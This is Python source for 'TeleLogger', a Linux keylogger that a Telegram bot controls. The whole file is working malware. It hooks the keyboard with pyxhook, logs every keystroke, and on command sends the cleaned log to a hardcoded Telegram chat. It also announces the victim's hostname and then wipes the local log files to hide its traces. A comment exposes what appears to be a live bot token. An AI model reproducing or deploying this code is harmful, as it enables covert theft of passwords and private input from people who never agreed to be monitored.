# -*- coding: utf-8 -*-

import pyxhook
import telebot
from telebot import types
import os
import subprocess
import socket

print("  _______   _      _						")
print(" |__   __| | |    | |						")
print("    | | ___| | ___| |     ___   __ _  __ _  ___ _ __		")
print("    | |/ _ \ |/ _ \ |    / _ \ / _` |/ _` |/ _ \ '__|		")
print("    | |  __/ |  __/ |___| (_) | (_| | (_| |  __/ |		")
print("    |_|\___|_|\___|______\___/ \__, |\__, |\___|_|		")
print("                                __/ | __/ |			")
print("                               |___/ |___/	ver 0.1		")
print("									")
print("						Alex Franco		")
print("									")


commands = {
                'start': 'Inicia keylogger.',
                'stop': 'Para el keylogger y envia teclas.',
}

help = "Comandos disponibles: \n \n"
for key in commands:
	help += "/" + key + ": "
	help += commands[key] + "\n"



TOKEN = raw_input('Introduce TOKEN: ') # 372274699:AAH8t7ML7zdXoCSxiJOqPSSFmTILQ68zflY
bot = telebot.TeleBot(TOKEN)
chat_id = "184832283" # -184142656
hostname = str("[/] ") +  socket.gethostname() + str(" connected")
bot.send_message(chat_id, hostname)
bot.send_message(chat_id, help)

print(" [*] Bot connected, waiting for order...")


log_file='file.log'



def OnKeyPress(event):
  fob=open(log_file,'a')
  fob.write(event.Key)
  fob.write('\n')

  if event.Ascii==96: #96 is the ascii value of the grave key (`)
    fob.close()
    new_hook.cancel()


@bot.message_handler(commands=['start'])
def register_keys(mensaje):
    print(" [*] Starting keylogger...")
    new_hook=pyxhook.HookManager()
    new_hook.KeyDown=OnKeyPress
    new_hook.HookKeyboard()
    new_hook.start()

@bot.message_handler(commands=['stop'])
def stop_register_keys(mensaje):
    print(" [*] Sending keys...")
    os.system("more file.log | tr -d '\n' | sed 's/65027]2/@/g' | sed 's/periodcom/./g'| sed 's/space/ /g' | sed 's/Return//g' | sed 's/Control_L//g' | sed 's/BackSpace/**BACKSPACE**/g' > filecut.log")
    doc = open('filecut.log', 'rb')
    bot.send_document(chat_id, doc)
    os.system("cat /dev/null > file.log")
    os.system("cat /dev/null > filecut.log")

bot.polling(none_stop = True)

